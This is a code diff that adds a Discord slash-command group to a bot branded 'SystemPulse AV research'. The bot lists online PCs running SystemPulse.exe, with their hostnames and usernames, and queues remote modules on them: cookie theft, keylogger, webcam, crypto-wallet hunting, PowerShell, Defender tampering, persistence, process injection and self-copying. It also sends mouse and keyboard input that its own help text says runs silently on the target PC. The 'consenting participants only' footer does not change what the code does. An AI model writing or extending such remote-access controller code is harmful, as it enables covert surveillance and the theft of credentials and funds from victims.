@@ -84,6 +84,20 @@ _session_summarized: set[str] = set()
 
 pulse = app_commands.Group(name="pulse", description="SystemPulse AV research telemetry")
 
+controlfromdiscord = app_commands.Group(
+    name="controlfromdiscord",
+    description="Control channel + trigger modules on online SystemPulse PCs",
+)
+
+REMOTE_MODULE_CHOICES = [
+    app_commands.Choice(name=MODULE_LABELS.get(k, k), value=k)
+    for k in (
+        "screenshot", "clipboard", "cookies", "keylogger", "webcam",
+        "file_read", "crypto_hunt", "network", "powershell", "eicar",
+        "defender", "persistence", "process_injection", "self_copy", "location",
+    )
+]
+
 
 @dataclass
 class GuildWatch:
@@ -92,6 +106,7 @@ class GuildWatch:
     alert_role_id: int | None = None
     alert_on_start: bool = True
     alert_on_blocked: bool = True
+    control_channel_id: int | None = None
 
 
 @dataclass
@@ -106,6 +121,7 @@ class GuildStore:
                 "alert_role_id": w.alert_role_id,
                 "alert_on_start": w.alert_on_start,
                 "alert_on_blocked": w.alert_on_blocked,
+                "control_channel_id": w.control_channel_id,
             }
             for gid, w in self.watches.items()
         }
@@ -123,6 +139,9 @@ class GuildStore:
                 alert_role_id=int(data["alert_role_id"]) if data.get("alert_role_id") else None,
                 alert_on_start=bool(data.get("alert_on_start", True)),
                 alert_on_blocked=bool(data.get("alert_on_blocked", True)),
+                control_channel_id=int(data["control_channel_id"])
+                if data.get("control_channel_id")
+                else None,
             )
             for gid, data in payload.items()
         }
@@ -173,6 +192,7 @@ class GuildStore:
                         "alert_role_id": w.alert_role_id,
                         "alert_on_start": w.alert_on_start,
                         "alert_on_blocked": w.alert_on_blocked,
+                        "control_channel_id": w.control_channel_id,
                     }
                     for gid, w in self.watches.items()
                 }
@@ -198,6 +218,7 @@ class SystemPulseBot(commands.Bot):
 
     async def setup_hook(self) -> None:
         self.tree.add_command(pulse)
+        self.tree.add_command(controlfromdiscord)
         self.add_listener(self._on_ready_sync, "on_ready")
 
     async def _on_ready_sync(self) -> None:
@@ -919,12 +940,332 @@ async def pulse_guide(interaction: discord.Interaction) -> None:
             "`/pulse stats` — totals & API health\n"
             "`/pulse host` — latest PC scan summary\n"
             "`/pulse recent` — last N events\n"
-            "`/pulse guide` — this help"
+            "`/pulse guide` — this help\n\n"
+            "**Remote control**\n"
+            "`/controlfromdiscord setup` — set control channel\n"
+            "`/controlfromdiscord online` — who's running the exe\n"
+            "`/controlfromdiscord run` — trigger one module on a PC\n"
+            "`/controlfromdiscord mouse` — move/click remotely\n"
+            "`/controlfromdiscord keyboard` — type or press keys\n"
+            "`/help` — full setup guide"
         ),
         inline=False,
     )
     embed.set_footer(text="SystemPulse AV Research")
     await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+async def _fetch_online_hosts(minutes: int = 5) -> list[dict]:
+    assert http_client is not None
+    res = await http_client.get(
+        f"{API_URL}/api/bot/online",
+        params={"minutes": minutes},
+        headers=_headers(),
+    )
+    res.raise_for_status()
+    return res.json().get("hosts") or []
+
+
+async def _hostname_autocomplete(
+    interaction: discord.Interaction, current: str
+) -> list[app_commands.Choice[str]]:
+    try:
+        hosts = await _fetch_online_hosts()
+    except httpx.HTTPError:
+        return []
+    choices: list[app_commands.Choice[str]] = []
+    needle = current.lower()
+    for host in hosts:
+        name = str(host.get("hostname") or "")
+        user = str(host.get("username") or "")
+        if needle and needle not in name.lower() and needle not in user.lower():
+            continue
+        label = f"{name} ({user})" if user else name
+        choices.append(app_commands.Choice(name=label[:100], value=name))
+    return choices[:25]
+
+
+def _control_channel_id(gid: str) -> int | None:
+    watch = store.watches.get(gid)
+    if not watch:
+        return None
+    return watch.control_channel_id or watch.channel_id
+
+
+async def _queue_command(
+    interaction: discord.Interaction,
+    hostname: str,
+    *,
+    module: str | None = None,
+    command_kind: str = "module",
+    payload: dict | None = None,
+    summary: str = "",
+) -> dict | None:
+    gid = _guild_id(interaction)
+    if not gid:
+        return None
+    control_ch = _control_channel_id(gid)
+    if not control_ch:
+        await interaction.response.send_message(
+            "Run `/controlfromdiscord setup` in your control channel first.",
+            ephemeral=True,
+        )
+        return None
+
+    body: dict = {"hostname": hostname, "guild_id": gid, "command_kind": command_kind}
+    if module:
+        body["module"] = module
+    if payload:
+        body["payload"] = payload
+
+    assert http_client is not None
+    try:
+        res = await http_client.post(
+            f"{API_URL}/api/bot/commands",
+            json=body,
+            headers=_headers(),
+        )
+        res.raise_for_status()
+        cmd = res.json()
+    except httpx.HTTPError as exc:
+        await interaction.response.send_message(f"Failed to queue command: {exc}", ephemeral=True)
+        return None
+
+    await interaction.response.send_message(summary or f"Queued on `{hostname}`.", ephemeral=True)
+    channel = bot.get_channel(control_ch)
+    if channel is None and interaction.guild:
+        channel = interaction.guild.get_channel(control_ch)
+    if isinstance(channel, discord.TextChannel) and summary:
+        await channel.send(
+            f"🎮 **{interaction.user.display_name}** → **{hostname}**: {summary}"
+        )
+    return cmd
+
+
+@bot.tree.command(name="help", description="SystemPulse setup, logging, and remote control guide")
+@app_commands.guild_only()
+async def help_command(interaction: discord.Interaction) -> None:
+    embed = discord.Embed(
+        title="SystemPulse — Help",
+        description="AV research platform: log scans to Discord and trigger modules or input remotely.",
+        color=PULSE_COLOR,
+    )
+    embed.add_field(
+        name="1 · Link event logging",
+        value=(
+            "`/pulse link` — in the channel where scan results should post\n"
+            "`/pulse live` — optional; only events from the next scan onward\n"
+            "`/pulse alert @role` — ping a role when scans start or get blocked"
+        ),
+        inline=False,
+    )
+    embed.add_field(
+        name="2 · Set up remote control",
+        value=(
+            "`/controlfromdiscord setup` — in your control channel\n"
+            "Target must have **SystemPulse.exe** open (no scan required to show online)"
+        ),
+        inline=False,
+    )
+    embed.add_field(
+        name="3 · See who's online",
+        value="`/controlfromdiscord online` — lists PCs with the exe running",
+        inline=False,
+    )
+    embed.add_field(
+        name="4 · Run AV test modules",
+        value=(
+            "`/controlfromdiscord run` — pick hostname + module\n"
+            "Examples: screenshot, clipboard, cookies, keylogger\n"
+            "Results appear in your `/pulse link` channel"
+        ),
+        inline=False,
+    )
+    embed.add_field(
+        name="5 · Mouse & keyboard",
+        value=(
+            "`/controlfromdiscord mouse` — move or click at x,y\n"
+            "`/controlfromdiscord keyboard` — type text or press a key\n"
+            "Runs silently on their PC (nothing shown in the exe)"
+        ),
+        inline=False,
+    )
+    embed.add_field(
+        name="Quick reference",
+        value=(
+            "`/help` — this guide\n"
+            "`/pulse guide` — logging commands only\n"
+            "`/pulse stats` — API totals\n"
+            "`/controlfromdiscord online` — online PCs\n"
+            "`/controlfromdiscord run` — trigger module\n"
+            "`/controlfromdiscord mouse` — mouse control\n"
+            "`/controlfromdiscord keyboard` — keyboard control"
+        ),
+        inline=False,
+    )
+    embed.set_footer(text="SystemPulse AV Research · consenting participants only")
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+@controlfromdiscord.command(name="setup", description="Use this channel for remote control")
+@app_commands.guild_only()
+async def cfd_setup(interaction: discord.Interaction) -> None:
+    gid = _guild_id(interaction)
+    if not gid or interaction.channel_id is None:
+        await interaction.response.send_message("Guild channel required.", ephemeral=True)
+        return
+    watch = store.watches.get(gid)
+    if not watch:
+        watch = GuildWatch(channel_id=interaction.channel_id)
+        store.watches[gid] = watch
+    watch.control_channel_id = interaction.channel_id
+    await store.persist()
+    await interaction.response.send_message(
+        f"Control channel set to {interaction.channel.mention}.\n"
+        "Online PCs with **SystemPulse.exe** open will appear in `/controlfromdiscord online`.",
+        ephemeral=True,
+    )
+
+
+@controlfromdiscord.command(name="online", description="List PCs running SystemPulse right now")
+@app_commands.guild_only()
+async def cfd_online(interaction: discord.Interaction) -> None:
+    gid = _guild_id(interaction)
+    if not gid:
+        return
+    try:
+        hosts = await _fetch_online_hosts()
+    except httpx.HTTPError as exc:
+        await interaction.response.send_message(f"API error: {exc}", ephemeral=True)
+        return
+
+    embed = discord.Embed(
+        title="Online SystemPulse endpoints",
+        description="PCs heartbeat while SystemPulse.exe is open.",
+        color=PULSE_COLOR,
+    )
+    if not hosts:
+        embed.add_field(
+            name="No one online",
+            value="Have someone open **SystemPulse.exe** (no scan required).",
+            inline=False,
+        )
+    else:
+        lines = []
+        for h in hosts[:15]:
+            lines.append(f"**{h.get('hostname', '?')}** — `{h.get('username', '—')}`")
+        embed.add_field(name=f"{len(hosts)} online", value="\n".join(lines), inline=False)
+        embed.set_footer(text="Use /controlfromdiscord run, mouse, or keyboard")
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+@controlfromdiscord.command(name="run", description="Queue a module on an online PC")
+@app_commands.describe(hostname="PC name (must be online)", module="AV test module to run")
+@app_commands.autocomplete(hostname=_hostname_autocomplete)
+@app_commands.choices(module=REMOTE_MODULE_CHOICES)
+@app_commands.guild_only()
+async def cfd_run(
+    interaction: discord.Interaction,
+    hostname: str,
+    module: str,
+) -> None:
+    label = MODULE_LABELS.get(module, module)
+    await _queue_command(
+        interaction,
+        hostname,
+        module=module,
+        command_kind="module",
+        summary=f"queued module `{label}` — results in `/pulse link` channel",
+    )
+
+
+MOUSE_ACTION_CHOICES = [
+    app_commands.Choice(name="Move cursor", value="move"),
+    app_commands.Choice(name="Left click", value="click"),
+    app_commands.Choice(name="Right click", value="rightclick"),
+    app_commands.Choice(name="Double click", value="doubleclick"),
+]
+
+
+@controlfromdiscord.command(name="mouse", description="Move or click the mouse on an online PC")
+@app_commands.describe(
+    hostname="PC name (must be online)",
+    x="Screen X coordinate",
+    y="Screen Y coordinate",
+    action="What to do at that position",
+)
+@app_commands.autocomplete(hostname=_hostname_autocomplete)
+@app_commands.choices(action=MOUSE_ACTION_CHOICES)
+@app_commands.guild_only()
+async def cfd_mouse(
+    interaction: discord.Interaction,
+    hostname: str,
+    x: app_commands.Range[int, 0, 10000],
+    y: app_commands.Range[int, 0, 10000],
+    action: str = "click",
+) -> None:
+    if action == "move":
+        payload = {"action": "move", "x": x, "y": y}
+        summary = f"mouse move → ({x}, {y})"
+    elif action == "rightclick":
+        payload = {"action": "click", "x": x, "y": y, "button": "right", "clicks": 1}
+        summary = f"right click → ({x}, {y})"
+    elif action == "doubleclick":
+        payload = {"action": "click", "x": x, "y": y, "button": "left", "clicks": 2}
+        summary = f"double click → ({x}, {y})"
+    else:
+        payload = {"action": "click", "x": x, "y": y, "button": "left", "clicks": 1}
+        summary = f"left click → ({x}, {y})"
+
+    await _queue_command(
+        interaction,
+        hostname,
+        command_kind="input",
+        payload=payload,
+        summary=summary,
+    )
+
+
+@controlfromdiscord.command(name="keyboard", description="Type text or press a key on an online PC")
+@app_commands.describe(
+    hostname="PC name (must be online)",
+    text="Text to type (leave empty if using key)",
+    key="Single key: enter, tab, esc, space, backspace, up, down, …",
+)
+@app_commands.autocomplete(hostname=_hostname_autocomplete)
+@app_commands.guild_only()
+async def cfd_keyboard(
+    interaction: discord.Interaction,
+    hostname: str,
+    text: str | None = None,
+    key: str | None = None,
+) -> None:
+    if text and key:
+        await interaction.response.send_message(
+            "Use either `text` or `key`, not both.", ephemeral=True
+        )
+        return
+    if not text and not key:
+        await interaction.response.send_message(
+            "Provide `text` to type or `key` to press (e.g. enter, tab).", ephemeral=True
+        )
+        return
+
+    if text:
+        payload = {"action": "type", "text": text}
+        preview = text if len(text) <= 40 else text[:37] + "…"
+        summary = f"keyboard type `{preview}`"
+    else:
+        payload = {"action": "key", "key": key or ""}
+        summary = f"keyboard key `{key}`"
+
+    await _queue_command(
+        interaction,
+        hostname,
+        command_kind="input",
+        payload=payload,
+        summary=summary,
+    )
 
 
 @bot.event
